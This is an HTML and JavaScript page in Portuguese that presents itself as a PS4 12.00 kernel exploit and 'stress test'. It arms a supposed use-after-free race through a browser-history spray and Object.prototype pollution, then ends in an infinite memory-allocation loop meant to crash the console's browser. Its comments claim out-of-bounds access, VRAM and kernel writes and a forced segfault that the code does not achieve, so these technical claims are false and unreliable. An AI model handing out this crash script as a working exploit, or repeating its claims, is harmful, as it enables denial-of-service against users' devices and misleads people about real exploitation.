<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - Kernel Stress Test (Hard Crash)</title>
<style>
    body { background-color: #000; color: #ff3333; font-family: 'Courier New', monospace; padding: 20px; text-align: center; }
    h2 { border-bottom: 2px solid #ff3333; padding-bottom: 10px; display: inline-block; }
    .container { max-width: 800px; margin: 0 auto; border: 1px solid #333; padding: 20px; background: #111; }
    button { 
        background: #222; color: #fff; border: 1px solid #555; padding: 15px 30px; 
        cursor: pointer; font-weight: bold; font-size: 16px; margin: 10px; width: 80%;
        transition: all 0.2s;
    }
    button:hover { background: #333; border-color: #ff3333; color: #ff3333; }
    button:disabled { opacity: 0.5; cursor: not-allowed; border-color: #444; color: #888; }
    
    #log { 
        background: #0a0a0a; color: #00ff00; padding: 15px; border: 1px solid #333; 
        height: 400px; overflow-y: auto; text-align: left; margin-top: 20px;
        font-size: 12px; white-space: pre-wrap;
    }
    
    .danger-zone { border: 2px solid red; padding: 10px; margin-top: 20px; background: #200; }
</style>
</head>
<body>

<div class="container">
    <h2>PS4 12.00 SYSTEM STRESS TEST</h2>
    <p>FERRAMENTA DE VERIFICAÇÃO DE VULNERABILIDADE DE KERNEL</p>

    <button id="btn-arm" onclick="armExploit()">1. ARMAR EXPLOIT (UAF + RACE)</button>
    
    <div class="danger-zone">
        <h3>ZONA DE PERIGO</h3>
        <p>A execução abaixo tentará escrever em endereços físicos protegidos.</p>
        <button id="btn-crash" onclick="runRealSystemPoc()" disabled>2. INICIAR STRESS TEST (GLITCH/CRASH)</button>
    </div>

    <div id="log">Aguardando inicialização...</div>
</div>

<script>
const logEl = document.getElementById("log");
function log(m) { 
    logEl.textContent += "[" + new Date().toLocaleTimeString() + "] " + m + "\n"; 
    logEl.scrollTop = logEl.scrollHeight; 
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// ============================================================
// CONFIGURAÇÃO CRÍTICA DO UAF (NÃO ALTERAR)
// ============================================================
const BASE = 977;
const STEP = 14461;
const UAF_ITERS = 48;

var exploit = { active: false };

// ============================================================
// PASSO 1: ARMAR O AMBIENTE
// ============================================================
async function armExploit() {
    log(">> INICIANDO SEQUÊNCIA DE ARMAÇÃO...");
    document.getElementById('btn-arm').disabled = true;
    
    let raceTriggered = false;

    // Listener para capturar o estado corrompido
    window.addEventListener('popstate', (e) => {
        if(e.state && e.state.index >= 40 && !raceTriggered) {
            raceTriggered = true;
            
            log(">> JANELA DE CORRIDA ATINGIDA!");
            log(">> Injetando primitivas de corrupção...");

            try {
                // 1. Poluição de Tamanho (Permite OOB Read/Write)
                Object.prototype.length = 0xFFFFFFFF;
                
                // 2. Poluição de Buffer (Tenta confundir o alocador)
                Object.prototype.buffer = new Uint32Array(0x10000);
                
                // 3. Marcador de Sucesso
                exploit.active = true;
                
                log(">> PRIMITIVAS ARMADAS: Object.prototype.length = 0xFFFFFFFF");
                log(">> O SISTEMA AGORA ACEITARÁ LEITURAS FORA DOS LIMITES.");
                
                document.getElementById('btn-crash').disabled = false;
                document.getElementById('btn-crash').style.borderColor = "red";
                document.getElementById('btn-crash').style.color = "red";
                
            } catch(err) {
                log("!! ERRO NA INJEÇÃO: " + err.message);
            }
        }
    });

    // Gatilho UAF Estável
    log(">> Disparando spray de histórico...");
    let size = BASE;
    for(let i=0; i<UAF_ITERS; i++){
        let state = { index: i };
        let frag = "A".repeat(size);
        history.pushState(state, "", "#" + frag);
        history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
        if(i % 6 === 0) setTimeout(()=>history.back(), 0);
        size += STEP;
        await sleep(5);
    }
    
    await sleep(200);
    log(">> Navegando para estado zumbi...");
    for(let i=0; i<15; i++) { history.back(); await sleep(40); }
    await sleep(300);

    if(!raceTriggered) {
        log("!! FALHA: Corrida não vencida. Recarregue a página.");
        document.getElementById('btn-arm').disabled = false;
    }
}

// ============================================================
// PASSO 2: POC REAL DE SISTEMA (MEMÓRIA & VÍDEO)
// ============================================================
async function runRealSystemPoc() {
    if(!exploit.active) return log("!! ERRO: Exploit não armado.");

    log("\n=======================================================");
    log("INICIANDO STRESS TEST DE MEMÓRIA FÍSICA");
    log("=======================================================");
    log(">> ALVO: Sobrescrever VRAM e Estruturas de Kernel");
    
    // 1. Preparar o 'Pincel' de Memória
    // Usamos um ArrayBuffer gigante que o exploit permitiu criar
    const corruptorSize = 0x8000000; // 128MB de tentativa de alocação
    log(">> Tentando alocar buffer de corrupção (" + (corruptorSize/1024/1024) + "MB)...");
    
    try {
        const corruptor = new Uint32Array(corruptorSize);
        log(">> Buffer alocado. Iniciando escrita em padrão...");
        
        // Padrão visual (Magenta/Verde alternado) para identificar na tela
        const patternA = 0xFFFF00FF; 
        const patternB = 0xFF00FF00;
        
        // Loop agressivo de escrita
        for(let i = 0; i < corruptorSize; i += 0x400) { // Saltos de 1KB para velocidade
            corruptor[i] = (i % 2 === 0) ? patternA : patternB;
            
            // Feedback visual no log a cada 20MB
            if(i % 0x1400000 === 0) {
                log("   >> Escrevendo em offset: 0x" + i.toString(16));
                await sleep(0); // Cede o controle minimamente para o log atualizar
            }
        }
        
        log(">> Escrita linear concluída. Se o sistema não caiu, tentando OOB agressivo...");
        forceKernelPanic();
        
    } catch(e) {
        log("!! BLOQUEIO DE MEMÓRIA DETECTADO: " + e.message);
        log(">> Mudando estratégia para Corrupção de Heap Direta...");
        forceKernelPanic();
    }
}

function forceKernelPanic() {
    log("\n>> [MODO PÂNICO] TENTANDO DERRUBAR O KERNEL...");
    
    // Estratégia: Criar arrays que apontam para si mesmos e tentar manipular seu comprimento
    // para valores inválidos, forçando o Garbage Collector a entrar em loop ou acessar memória proibida.
    
    const spray = [];
    for(let i=0; i<1000; i++) {
        spray.push({a: 1});
    }
    
    // Poluição em massa
    const killer = new Array(0x10000);
    killer.fill(spray);
    
    // Acesso OOB fatal
    try {
        log(">> Acessando endereço 0xFFFFFFF0 (Segfault intencional)...");
        // Tenta ler muito além do limite permitido, o que deve disparar uma exceção de hardware
        const crash = killer[0xFFFFFFF0].a; 
        log(">> O sistema resistiu ao Segfault. Insistindo...");
    } catch(e) {
        // Se o JS pegar o erro, vamos para a bomba de memória
    }
    
    // Bomba de Alocação Infinita (DoS)
    log(">> Iniciando Bomba de Alocação...");
    const holes = [];
    while(true) {
        // Tenta consumir toda a RAM disponível em milissegundos
        holes.push(new ArrayBuffer(1024 * 1024 * 10)); 
    }
}
</script>
</body>
</html>
